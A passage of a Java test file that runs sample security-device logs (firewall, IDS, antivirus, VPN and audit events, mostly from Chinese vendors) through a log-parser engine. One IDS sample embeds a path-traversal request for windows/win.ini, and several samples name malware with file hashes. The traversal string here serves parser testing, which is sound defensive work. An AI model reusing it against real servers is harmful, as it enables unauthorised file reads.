      data = "<19>May 26 11:00:57 VmsecController CEF:0|Qianxin|奇安信网神统一服务器安全管理系统|8.0.3.114|2401|防恶意软件日志|4|eventID=2401\tdescription=防恶意软件日志\ttime=2021-12-07 16:34:19\tpool=新注册主机\thost=Windows-test\tvm=Windows-test\tip=10.76.50.112\tvmid=cfa60642-545b-6dd8-b42c-fcdb28798852\taction=2\tos=131072\tpolicy=Windows安全配置\tmalwaretype=8\tmalwarename=Archive:Trojan.Win32.Downloader.DO\tfilename=C:\\Users\\administer\\Desktop\\防恶意软件测试软件 - 副本.rar==>防恶意软件测试软件\\Trojan.Downloader - 副本.Small-195\tisolatefilename=C:\\Program Files\\Nubosh\\icsagent\\file\\quar\\1638866059.142166434\tgroup=默认分组\ttenantid=baf2c8ca-7a2e-4bed-9c7c-1be9e3c381ce\ttenantname=test01\tyear=2021";
      parse(botuEngine, data);
      data = "<19>May 26 11:00:57 VmsecController CEF: 0|Qianxin|奇安信网神统一服务器安全管理系统|8.0.3.114|2406|完整性监控日志|4|eventID=2406\tdescription=完整性监控日志\ttime=2021-12-07 14:08:01\tpool=新注册主机\tvm=Linux-test\tvmid=cfa60642-545b-6dd8-b42c-fcdb28798852\tgroup=默认分组\tpolicy=Linux安全配置\trule=12001\tfilepath=Process delete:PID[11711] PPID[11704] Path[sleep]\ttenantid=baf2c8ca-7a2e-4bed-9c7c-1be9e3c381ce\ttenantname=test01\tyear=2021";
      parse(botuEngine, data);
      data = "<19>May 26 11:00:57 VmsecController CEF: 0|Qianxin|奇安信网神统一服务器安全管理系统|8.0.3.114|2405|入侵防御日志|4|eventID=2405\tdescription=入侵防御日志\ttime=2021-12-07 15:00:34\tlogtype=3\tpool=新注册主机\tvm=Linux-test\tvmid=cfa60642-545b-6dd8-b42c-fcdb28798852\tpolicy=Linux安全配置\tapp=0\taction=1\tseverity=1\tdirection=0\tmac=-\tprotocol=6\tsourceip=10.76.50.162\tsourceport=36913\tdestip=10.76.50.161\tdestport=8080\tattacktype=1\tipsrule=61041819\turl=-\tappgroup=-1\tgroup=默认分组\ttenantid=baf2c8ca-7a2e-4bed-9c7c-1be9e3c381ce\ttenantname=test01\tyear=2021";
      parse(botuEngine, data);
      data = "<19>May 26 11:00:57 VmsecController CEF: 0|Qianxin|奇安信网神统一服务器安全管理系统|8.0.3.114|2402|防火墙日志|4|eventID=2402\tdescription=防火墙日志\ttime=2021-12-07 14:16:33\tlogtype=1\tpool=新注册主机\tvm=Linux-test\tvmid=cfa60642-545b-6dd8-b42c-fcdb28798852\tpolicy=Linux安全配置\taction=0\tdirection=0\tmac=-\tprotocol=13\tsourceip=10.76.50.162\tsourceport=0\tdestip=10.76.50.165\tdestport=0\turl=-\trulename=防火墙test\tgroup=默认分组\ttenantid=baf2c8ca-7a2e-4bed-9c7c-1be9e3c381ce\ttenantname=test01\tyear=2021";
      parse(botuEngine, data);*/
      data = "<22>Jun  7 14:44:57 VmsecController eventID=2432\tIP=10.135.12.81\tdescription=升级管理中心特征库成功\toperator=System\tobject=特征库\ttenantid=\ttenantname=\ttime=2023-06-07 14:44:57";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testAuditWebRayv3() {
    String parserFile = "./resources/parsers/audit_webray_raysas[v3.3]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<14>Jun  2 11:26:35 fort {\"description\":\"class:class com.cloud.app4a.module.logout.LogoutController | class@RequestMapping:/logout | method:String com.cloud.app4a.module.logout.LogoutController.logout(HttpServletRequest) | method@RequestMapping:/exit | parames:[Ljava.lang.Object;@3224df37 | returning:{\\\"result\\\":\\\"0\\\",\\\"message\\\":\\\"成功\\\"} | throwing:\",\"domain\":\"公司\",\"domainuuid\":\"000\",\"functionname\":\"登录认证\",\"functionuuid\":\"class com.cloud.app4a.module.logout.LogoutController\",\"ip\":\"192.168.10.142\",\"loginname\":\"SysAdmin\",\"loginsession\":\"\",\"name\":\"系统管理员\",\"operdate\":1685676395319,\"operid\":\"logout\",\"opername\":\"退出\",\"operobjectname\":\"\",\"operobjectuuid\":\"\",\"operresult\":\"成功\",\"taskuuid\":\"\",\"uuid\":\"0f642f01-7b15-4f81-976d-340145b199f3\"}";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testEdrHuorongSec() {
    String parserFile = "./resources/parsers/edr_huorongsec_edr_warn.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<29>May 29 17:42:30 WIN-0SBQ54CIQUH Security-SPP: 900: 软件保护服务正在启动。 参数: caller=wmiprvse.exe";
      parse(botuEngine, data);
      data = "<29>May 29 17:35:18 WIN-0SBQ54CIQUH Security-Auditing: 4672: AUDIT_SUCCESS 为新登录分配了特殊权限。 使用者: 安全 ID: S-1-5-18 帐户名: WIN-0SBQ54CIQUH$ 帐户域: APPAGENT 登录 ID: 0xCDA8F4F 特权: SeSecurityPrivilege SeBackupPrivilege SeRestorePrivilege SeTakeOwnershipPrivilege SeDebugPrivilege SeSystemEnvironmentPrivilege SeLoadDriverPrivilege SeImpersonatePrivilege SeEnableDelegationPrivilege";
      parse(botuEngine, data);
      data = "<29>May 29 17:34:14 WIN-0SBQ54CIQUH Creating file with filename: evtsys.cfg";
      parse(botuEngine, data);
      data = "<6>2023-05-29T11:04:50+08:00 WIN-0SBQ54CIQUH HRESS[7932]: {\"center_version\":\"2.0.10.4\",\"event\":{\"id\":43,\"newver\":\"2023-05-28 17:28:25\",\"orgver\":\"2023-05-27 17:58:55\",\"product\":\"Windows V2.0 病毒库升级\",\"result\":\"升级成功\",\"ts\":1685329450,\"url\":\"https://down5.huorong.cn\"},\"event_type\":\"升级日志\"}";
      parse(botuEngine, data);
      data = "";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testIpsVenusVsg() {
    String parserFile = "./resources/parsers/ips_venus_vsg_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<205>Feb 23 10:46:48 vsg AV: SerialNum=0113251411269999 GenTime=\"2016-02-23 10:46:48\" SrcIP=112.5.254.117 SrcIP6= SrcIPVer=4 DstIP=192.168.13.47 DstIP6= DstIPVer=4 Protocol=TCP SrcPort=80 DstPort=59007 InInterface=ge0/2 OutInterface=ge0/1 SMAC=00:10:f3:fa:0d:80 DMAC=68:f7:28:97:8f:5d FwPolicyID=6 ProtocolID=10 ProtocolType=http VirusName=BlockFile Action=BLOCK VirusFileName=Visio2007.rar Content=\"file is blocked\" EvtCount=1";
      parse(botuEngine, data);
      data = "<204>Feb 23 18:11:51 vsg AV: SerialNum=0112031501109999 GenTime=\"2016-02-23 18:11:51\" SrcIP=172.16.2.172 SrcIP6= SrcIPVer=4 DstIP=172.16.2.220 DstIP6= DstIPVer=4 Protocol=TCP SrcPort=19869 DstPort=25 InInterface=ge0/3 OutInterface=ge0/4 SMAC=ec:88:8f:eb:4b:95 DMAC=ec:88:8f:f3:98:d5 FwPolicyID=1 ProtocolID=16 ProtocolType=smtp VirusName=Backdoor/win32.Graybird.dxl Action=DROP VirusFileName=Backdoor.win32.Graybird.dxl.(2720E1A2BBA1B93F38A26D848C4A75EA).exe VirusFileSize=5808 MailSender=frank@daisy.com MailTitle=test MailRecipient=frank@daisy.com EvtCount=1";
      parse(botuEngine, data);
      data = "<213>Feb 23 11:34:42 vsg IPS: SerialNum=0113251411269999 GenTime=\"2016-02-23 11:34:42\" SrcIP=192.168.13.124 SrcIP6= SrcIPVer=4 DstIP=192.168.13.1 DstIP6= DstIPVer=4 Protocol=UDP SrcPort=161 DstPort=53457 InInterface=ge0/1 OutInterface=ge0/2 SMAC=00:10:f3:48:cd:28 DMAC=00:10:f3:fa:0d:80 FwPolicyID=6 EventName=SNMP_缺省口令[public] EventID=152518449 EventLevel=1 EventsetName=ALL_test SecurityType=可疑行为 SecurityID=12 ProtocolType=SNMP ProtocolID=27 Action=PASS Vsysid=0 Content=\"口令=public;\" CapToken=308890 EvtCount=1";
      parse(botuEngine, data);
      data = "<220>Feb 23 18:39:56 vsg ATTACK: SerialNum=0113251411269999 GenTime=\"2016 02 23 18:39:56\" SrcIP=192.168.13.8 SrcIP6= SrcIPVer=4 DstIP=74.125.23.139 DstIP6= DstIPVer=4 Protocol=TCP SMAC=f0:de:f1:49:54:eb DMAC=00:10:f3:fa:0d:80 InInterface=ge0/1 OutInterface=ge0/2 Content=\"source reachereached TCP session limit:10\" EvtCount=1d TCP session limit:10\" EvtCount=1";
      parse(botuEngine, data);
      data = "<318>Feb 23 19:51:34 vsg FILTER: SerialNum=0113251411269999 GenTime=\"2016 02 23 19:51:34\" SrcIP=192.168.13.38 SrcIP6= SrcIPVer=4 DstIP=192.168.14.190 DstIP6= DstIPVer=4 Protocol=TCP SrcPort=4022 DstPort=80 InInterface=ge0/1 OutInterface=ge0/2 FwPolicyID=1 Action=DENY Content=\"POLICY*: The packet was blocked because the NIPS policy is deny\" EvtCount=1";
      parse(botuEngine, data);
      data = "<677>Jul 17 15:48:13 vsg ACCESS_LINK: SerialNum=1103331709079998 GenTime=\"2018-07-17 15:48:13\" AccessTime=2018-07-17 15:48:13 SrcMac=6c-62-6d-9d-7c-df SrcIP=1.1.1.100 DstIP=1.1.1.255 Protocol=udp SrcPort=138 DstPort=138 Access=否 AccessType=1 SwitchIf=Unknown SwitchIp=Unknown DevName=Unknown DevType= timeint=1531842493 Contacts=Unknown Addr=Unknown Brand=Unknown EvtCount=1 InDevInfo=未知: OutDevInfo=未知:";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testFirewallChinaTelecomStoneOs() {
    String parserFile = "./resources/parsers/firewall_chinatelecom_stoneos[v5.5]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<190>Jul  4 16:29:21 3411415223002432\u0005T1(root) 44243641 Traffic@FLOW: SESSION: 192.168.0.8:20530(ethernet0/0)->1.1.1.1:58386(ethernet0/1), APP/Protocol PING/ICMP: ECHO_REQUEST, vr trust-vr, policy 1, user -@-, host -, mac 0000.0000.0000, send packets 1, send bytes 78, receive packets 0, receive bytes 0, zone from trust to untrust, start time 2023-07-04 16:29:13, close time 2023-07-04 16:29:21, session end, Ageout";
      parse(botuEngine, data);
      data = "<190>Jul  4 15:48:54 0010080073608649(root) 42142604 Configuration@MGMT: \"ecfwadmin\"@webui, syslog_server_tbl: \"222.180.208.50\", \"ethernet0/0\", 2, 2, 65514, set, event: 0 -> 1; server_cert_check_disable: 0 -> 0; config: 0 -> 1; network: 0 -> 1; threat: 0 -> 1; trafficsession: 0 -> 1; trafficnat: 0 -> 1; trafficwebsurf: 0 -> 1; trafficpbr: 0 -> 1; sandbox: 0 -> 1; datas_dlp: 0 -> 1; datas_cf: 0 -> 1; datas_nbr: 0 -> 1; ei: 0 -> 1";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testBastion() {
    String parserFile = "./resources/parsers/bastion_hillstone_osg3000_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "Jul 17 14:58:33 hillstone UMA: type=login date=2023-07-17 14:58:33 srcip=12.2.0.2 sysuser=superman module=WEB result=success";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testIdsLeadsecSyslog() {
    String parserFile = "./resources/parsers/ids_leadsec_ids_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "{\"dt\":\"VENUS_CS_0700R0600B20171018144640\",\"virus_name\":\"Virus/Win32.Parite.gh\",\"virus_file_name\":\"Backdoor.Win32.Agent.hj.(3FB0E2520D73EB7C589D8F56D2EED964).cpl\",\"protocol\":\"FTP\",\"src_ip\":\"fa11:1234:1234:1234:1234:1234:1234:27\",\"dst_ip\":\"fa11:1234:1234:1234:1234:1234:1234:26\",\"src_mac\":\"E005C5F37B20\",\"dst_mac\":\"0021CCB9DC4B\",\"src_port\":\"1266\",\"dst_port\":\"21\",\"start_time\":\"1508759104\",\"msg\":\" \",\"event_level\":\"4\"}";
      parse(botuEngine, data);
      data = "{\"dt\":\"VENUS_CS_0700R0600B20171018144640\",\"virus_name\":\"black-list/1\",\"protocol\":\"HTTP\",\"src_ip\":\"10.33.12.119\",\"dst_ip\":\"10.33.9.80\",\"src_mac\":\"0004C1A2CA82\",\"dst_mac\":\"0002B3B3CB86\",\"src_port\":\"2173\",\"dst_port\":\"27247\",\"start_time\":\"1508754994\",\"msg\":\"10.6.99.35/images/style.css\",\"event_level\":\"4\",\"url\":\"1black-list/1\",\"virus_type\":\"0\"}";
      parse(botuEngine, data);
      data = "{\"dt\":\"VENUS_CS_0700R0600B20171018144640\",\"level\":30,\"id\":\"152324804\",\"type\":\"Alert Log\",\"time\":1508995823653,\"source\":{\"ip\":\"10.33.9.80\",\"port\":1080,\"mac\":\"00-02-b3-b3-cb-86\"},\"destination\":{\"ip\":\"10.33.12.19\",\"port\":1288,\"mac\":\"00-04-c1-a2-ca-82\"},\"protocol\":\"TCP\",\"securityid\":\"4\",\"attackid\":\"1002\",\"subject\":\" TCP_NMAP_SYN_FIN_扫描\",\"message\":\"nic=3;数据长度=44;TCP数据内容=24 00 00 00 01 00 00 00 1c 00 00 00 90 33 00 00 06 0f 14 00 40 d6 03 08 e0 4d 00 08 cd cd 00 00 00 00 27 06 70 47 00 00 90 33 00 00;\"}";
      parse(botuEngine, data);
      data = "{\"dt\":\"VENUS_CS_0700R0600B20171018144640\",\"name\":\"TEVobGJ1TjM1bld4LnBwVA==\",\"type\":\"1\",\"protocol\":\"SMTP\",\"content\":\"{\\\"sender\\\":\\\"IEhIcDdEQGV1dkpkVS5vcmc=\\\", \\\"recipient\\\":\\\"IFpHbUZWSjNZWWJpbVMyVk5jVVkzZHZVRVduc25nRXg1QFZvemhSYVV3RHZadlRqTWZiUmNWanBXamJRSVZpLm9yZw==\\\", \\\"email_title\\\":\\\"RXdZNTRvZ0p4d1NOcmFMdXl4Z25ub3FoWHlBdDdFODVHVXBEMmc=\\\", \\\"unzip_src\\\":\\\"\\\", \\\"unzip_layer\\\":\\\"0\\\"}\",\"file_type\":\"doc\",\"md5\":\"7b54fb9bab3861b9d41fd08358e2d72f\",\"src_ip\":\"1.1.1.83\",\"dst_ip\":\"2.2.2.4\",\"src_port\":\"63977\",\"dst_port\":\"25\",\"start_time\":\"1508808567\"}";
      parse(botuEngine, data);
      data = "{\"dt\":\"VENUS_CS_0700R0600B20171018144640\",\"type\":\"url\",\"src_ip\":\"10.33.12.119\",\"dst_ip\":\"10.33.9.80\",\"src_port\":\"2173\",\"dst_port\":\"27247\",\"start_time\":\"1508750828\",\"character\":\"http://10.6.99.35/images/style.css\",\"event_level\":\"40\"}";
      parse(botuEngine, data);
      data = "{\"dt\":\"VENUS_CS_0700R0600B20171018144640\",\"name\":\"TEVobGJ1TjM1bld4LnBwVA==\",\"type\":\"1\",\"protocol\":\"SMTP\",\"content\":\"{\\\"sender\\\":\\\"IEhIcDdEQGV1dkpkVS5vcmc=\\\", \\\"recipient\\\":\\\"IFpHbUZWSjNZWWJpbVMyVk5jVVkzZHZVRVduc25nRXg1QFZvemhSYVV3RHZadlRqTWZiUmNWanBXamJRSVZpLm9yZw==\\\", \\\"email_title\\\":\\\"RXdZNTRvZ0p4d1NOcmFMdXl4Z25ub3FoWHlBdDdFODVHVXBEMmc=\\\", \\\"unzip_src\\\":\\\"\\\", \\\"unzip_layer\\\":\\\"0\\\"}\",\"file_type\":\"doc\",\"md5\":\"7b54fb9bab3861b9d41fd08358e2d72f\",\"src_ip\":\"1.1.1.83\",\"dst_ip\":\"2.2.2.4\",\"src_port\":\"63977\",\"dst_port\":\"25\",\"start_time\":\"1508808567\"}";
      parse(botuEngine, data);
      data = "<12>Aug 9 18:22:42 localhost : {\"dt\":\"LEADSEC_IDS_0700R0500B20220312190013\",\"level\":30,\"id\":\"152520200\",\"type\":\"Alert Log\",\"time\":1691576562781,\"source\":{\"ip\":\"192.168.3.50\",\"port\":1623,\"mac\":\"\"},\"destination\":{\"ip\":\"192.168.3.40\",\"port\":80,\"mac\":\"\"},\"protocol\":\"HTTP\",\"subject\":\"HTTP_文件与目录访问\",\"message\":\"nic=5;Method=GET;Host=192.168.3.191;URL长度=31;Http协议头长度=175;URL=/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini;访问文件=win.ini;MsgbodyData=;\",\"securityid\":\"12\",\"attackid\":\"1001\"}";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testFirewallDBAPPSecurityFirewallSyslog() {
    String parserFile = "./resources/parsers/firewall_dbappsecurity_firewall_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<30>Aug  4 10:39:02 localhost dockerd: time=\"2023-08-04T10:39:02.090100519+08:00\" level=error msg=\"error sending message to peer\" error=\"rpc error: code = Unavailable desc = all SubConns are in TransientFailure, latest connection error: connection error: desc = \\\"transport: Error while dialing dial tcp 10.10.10.34:2377: connect: connection refused\\\"\"";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testNacHuawei() {
    String parserFile = "./resources/parsers/nac_huawei_agile_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<190>2011-04-20 16:00:28 AgileController %%01POLICY/6/VIOLATE(l): The policy.win.monitor.adapter policy was violated. user=\"ddd\" ip=\"172.19.10.166\" mac=\"00-E0-4C-90-3C-AE\"  rank=\"20\" msg=\"NICAmount:2\"";
      parse(botuEngine, data);
      data = "<190>2011-04-20 16:00:28 AgileController %%01AGENTLOG/6/LOGONOROFF(l): The agent logged on. user=\"Jim\" hostname=\"MyComputer1\" ip=\"172.19.10.166\" logtype=\"1\" authtype=\"1\" time=\"2011-04-20 15:59:42\" mac=\"00-E0-4C-90-3C-AE\" result=\"1\"";
      parse(botuEngine, data);
      data = "<190>2011-04-20 16:00:28 AgileController %%01SOFTDIS/6/SOFTWAREDIS(l): Software distributed result. taskname=\"soft_distributions\" result=\"0\" user=\"Jim\" ip=\"172.19.10.166\" msg=\"soft1.txt 1.4k Download_failed;soft2.exe 2M Download_completed\"";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testAptHuawei() {
    String parserFile = "./resources/parsers/apt_huawei_firehunter6000_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<190>2011-04-20 16:00:28 AgileController %%01CLI/4/TEMPLATE_INSTALL_YES: The user chose Y when deciding whether to install the template.";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testAntivirusVenus() {
    String parserFile = "./resources/parsers/antivirus_venus_jc-svr-standard_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<28>2023-02-10T11:55:00-05:00 fangbingdu demotag[18146]: devid=”9c5ca7a79df1b053f51ed90df00ff143” time=1528454037 event_class_id=0x0700 event_id=0x0701 alarm=0 level=3 virus_name=”Win32.Exploit.Eternalblue.Z1.zav” virus_type=”文档病毒” virus_path=”C:\\Windows\\SecureBootThemes\\Microsoft\\eteb-2.dll” virus_md5=”47106682e18b0c53881252061ffcaa2d” report_time=1528454037 clean_time=1528454037 is_sync=0 event_type=”闪电查杀” file_size=128512 file_origin=”实时防护” op_result=”已清除” dev_name=”DESKTOP-OU52KM4” ip=”192.168.1.23”";
      //parse(botuEngine, data);
      data = "devid=\"9c5ca7a79df1b053f51ed90df00ff143\" time=1528454037 event_class_id=0x0700 event_id=0x0701 alarm=0 level=3 virus_name=\"Win32.Exploit.Eternalblue.Z1.zav\" virus_type=\"文档病毒\" virus_path=\"C:\\Windows\\SecureBootThemes\\Microsoft\\eteb-2.dll\" virus_md5=\"47106682e18b0c53881252061ffcaa2d\" report_time=1528454037 clean_time=1528454037 is_sync=0 event_type=\"闪电查杀\" file_size=128512 file_origin=\"实时防护\" op_result=\"已清除\" dev_name=\"DESKTOP-OU52KM4\" ip=\"192.168.1.23\"";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testFirewallWebraySyslog() {
    String parserFile = "./resources/parsers/firewall_webray_firewall_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<380>Aug 30 18:27:27 host IF_INFO: SerialNum=100220002022082814005888 GenTime=\"2023-08-30 18:27:27\" Content=\"interface ge0/0(ge0/0) link down\" EvtCount=1";
    /*  parse(botuEngine, data);
      data = "<190>date=2023-11-15 time=17:31:48 devname=APW1KMF00YY00018 device_id=APW1KMF00YY00018 log_id=2 type=traffic subtype=allowed pri=information status=accept vd=\"root\" dir_disp=org tran_disp=noop src=192.168.70.251 srcname=192.168.70.251 src_port=41332 dst=60.221.72.133 dstname=60.221.72.133 dst_port=443 tran_ip=N/A tran_port=0 service=443/tcp proto=6 app_type=N/A duration=330 rule=2 policyid=2 identidx=0 sent=164 rcvd=448 shaper_drop_sent=0 shaper_drop_rcvd=0 perip_drop=0 shaper_sent_name=\"N/A\" shaper_rcvd_name=\"N/A\" perip_name=\"N/A\" sent_pkt=3 rcvd_pkt=8 vpn=\"N/A\" src_int=\"port4\" dst_int=\"port3\" SN=10141916 app=\"N/A\" app_cat=\"N/A\" user=\"N/A\" group=\"N/A\" carrier_ep=\"N/A\" result=\"close-wait\" src_mac=\"N/A\" dst_mac=\"N/A\"";
      parse(botuEngine, data);
      data = "<190>date=2023-11-16,time=16:18:32,devname=APW1KMF00YY00018,device_id=RAY1KMF001000151,log_id=32005,type=event,subtype=admin,pri=information,vd=root,user=\"admin\",ui=https(192.168.70.1),action=logout,status=success,reason=timeout,msg=\"admin|https(192.168.70.1)\"";
      parse(botuEngine, data);*/
      data = "<189>date=2023-11-16 time=16:13:56 devname=APW1KMF00YY00018 device_id=APW1KMF00YY00018 log_id=12555 type=webfilter subtype=urlfilter pri=notice vd=\"root\" policyid=2 identidx=0 serial=10346531 user=\"N/A\" group=\"N/A\" src=192.168.18.76 sport=55616 src_port=55616 dst=106.74.11.21 dport=443 dst_port=443 profiletype=\"Webfilter_Profile\" profilegroup=\"N/A\" profile=\"N/A\" service=\"https\" status=\"blocked\" msg=\"由于服务器证书丢失或无效，SSL会话被阻止\"";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testMgmtHuaweiIbmcSyslog() {
    String parserFile = "./resources/parsers/appserver_huawei_ibmc_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<174> iBMC 2106180052XDN5000410 : 2023-09-07 02:28:50 WEB,Administrator@28.7.11.90,User,Administrator(28.7.11.90) logged out due to session timeout";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testIdsQianxinSecIdsSyslog() {
    String parserFile = "./resources/parsers/ids_qianxin_secids3600_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<174> iBMC 2106180052XDN5000410 : 2023-09-07 02:28:50 WEB,Administrator@28.7.11.90,User,Administrator(28.7.11.90) logged out due to session timeout";
      //parse(botuEngine, data);
      data = "<3>localhost 2023-09-18 15:00:00 IDSqianxin1 IDS/LOG_SMTP/8: server:192.168.1.10 sport:443 from:testclient@qq.com to:testserver@qq.com";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testVpnVenusSag6000Syslog() {
    String parserFile = "./resources/parsers/vpn_venus_sag6000[v3.0]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<134>Sep 14 15:37:20 Themis : devid=51 date=2023-09-14T15:37:20.968+0800 dname=Themis logtype=4 pri=6 mod=AUTHCENTER act=login result=0 user=- username=\"zhairui\" usertype=0 auth_type=1 sid=14UlPv9,uVPxd-k9awna login_ip=112.45.97.127 reason=0 dsp_msg=\"用户 [zhairui] 登录成功!\"";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testAcmVenusACMSyslog() {
    String parserFile = "./resources/parsers/acm_anzhou-tech_az6000_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<6>Sep 14 15:14:26 Venustech;540102000123042042514969;ipv4;3; policy_detail: src_ip=10.94.5.201;dst_ip=157.255.4.39;protocol=TCP;src_port=41972;dst_port=443;in_interface=ge7;out_interface=ge6;policyid=1;action=permit;Content=\"POLICY*: The packet pass because the firewall policy is permit";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testFirewallDbappsecurityDastgfwSyslog() {
    String parserFile = "./resources/parsers/firewall_dbappsecurity_das-tgfw_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "dataAll operationlog info logmon- plugin.operationlogger 2022-12-20T09:04:33.509539926Z \"operatoruser\":\"admin\",\"operatorip\":\"192.168.2.10\",\"message\":\" 清 除 会 话 成 功\",\"level\":\"info\"";
/*      parse(botuEngine, data);
      data = "dataAll systemlog info agent- init.systemlogger 2022-12-19T03:39:44.293391858Z \"message\":\"初始化资产扫描任务完成\",\"level\":\"info\"";
      parse(botuEngine, data);
      data = "dataAll ipssec test.idmclogger 2022-12-19T03:42:09.497962089Z \"gid\":\"1\",\"sip\":\"10.0.116.48\",\"sport\":\"10\",\"dip\":\"193.182.111.141\",\"dport\":\"999\",\"proto\":\"icmp\",\"sid\":8453186,\"isipv6\":0,\"policyid\":10,\"ipsid\":1,\"priority\":1,\"action\":3,\"extstr\":\"\",\"hit_profile\":\"test1\",\"hit_rule\":\"rule1\",\"count\":10,\"alert_time\":60,\"msg\":\"test-----9\",\"message\":\"test-----9\",\"lasttime\":\"1653384370\",\"level\":\"info\"";
      parse(botuEngine, data);
      data = "dataAll virussec test.idmclogger 2022-12-19T03:42:09.497969448Z \"gid\":\"903\",\"sip\":\"10.0.116.48\",\"sport\":\"10\",\"dip\":\"193.182.11.141\", \"dport\":\"999\", \"protocol\":\"icmp\",\"sid\":8453186, \"isipv6\":0, \"policyid\":10, \"ipsid\":1, \"priority\":1, \"action\":3, \"count\":10,\"alert_time\":60,\"app_protocol\":\"aaa\",\"filename\":\"bb.txt\",\"vir_malware_name \":\"trojan virus\",\"filesize\":\"10\",\"from\":\"edr\",\"msg\":\"test-----9\",\"message\":\"test-----9\",\"lasttime\":\"1653384370\",\"level\":\"info\"";
      parse(botuEngine, data);
